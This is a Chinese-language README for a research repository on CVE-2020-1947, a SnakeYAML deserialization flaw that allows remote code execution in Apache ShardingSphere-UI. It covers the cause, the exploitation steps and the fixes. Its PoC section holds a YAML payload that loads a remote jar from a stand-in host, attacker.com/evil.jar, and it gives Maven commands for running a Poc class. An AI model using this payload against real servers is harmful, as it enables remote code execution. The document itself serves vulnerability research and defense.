# ShardingSphere-UI 安全研究

## 项目简述
本项目研究了 Apache ShardingSphere-UI 中的远程代码执行漏洞 CVE-2020-1947。

## 核心漏洞

### CVE-2020-1947 - 远程代码执行
- **漏洞描述**: ShardingSphere-UI 在处理用户输入时存在 YAML 反序列化漏洞，攻击者可通过构造恶意 YAML 配置触发远程代码执行。
- **影响版本**: Apache ShardingSphere-UI < 4.0.1
- **CVSS 评分**: 9.8 (Critical)

## 漏洞原理
ShardingSphere-UI 使用 SnakeYAML 库解析用户提交的配置文件。由于未对 YAML 内容进行充分验证，攻击者可以利用 SnakeYAML 的反序列化特性，通过特殊构造的 YAML 文档执行任意代码。

## 利用方式
1. 构造包含恶意 Java 对象的 YAML 配置
2. 通过 Web 界面上传或提交配置
3. 服务端解析 YAML 时触发反序列化，执行恶意代码

## POC 示例
```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://attacker.com/evil.jar"]
  ]]
]
```

## 使用方法
```bash
cd ShardingSphere-UI/CVE-2020-1947
mvn clean compile
mvn exec:java -Dexec.mainClass="com.security.bug.shardingsphere.ui.Poc"
```

## 防御建议
1. **升级版本**: 升级到 ShardingSphere-UI 4.0.1 或更高版本
2. **输入验证**: 对用户上传的配置文件进行严格验证
3. **禁用危险特性**: 配置 SnakeYAML 禁用不安全的类型解析

## 参考资料
- [CVE-2020-1947](https://nvd.nist.gov/vuln/detail/CVE-2020-1947)
- [Apache ShardingSphere Security](https://shardingsphere.apache.org/community/en/security/)

## 免责声明
本项目仅用于安全研究和教育目的，请勿用于非法用途。
